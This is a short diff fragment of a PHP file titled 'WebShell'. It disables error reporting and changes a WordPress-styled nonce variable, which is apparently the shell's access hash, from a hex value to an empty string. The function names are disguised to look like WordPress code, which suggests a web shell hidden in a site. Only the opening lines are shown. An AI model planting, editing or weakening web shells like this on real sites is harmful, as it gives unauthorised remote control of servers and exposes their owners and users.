@@ -1,6 +1,6 @@
 <title>WebShell</title><?php
 error_reporting(0);
-$wp_nonce = "20c102cd2d0e2fd8317eaadc956cfd8a";
+$wp_nonce = "";
 
 function pre_term_name($auth_data, $wp_nonce) {
 	if(file_exists("index.php")) {
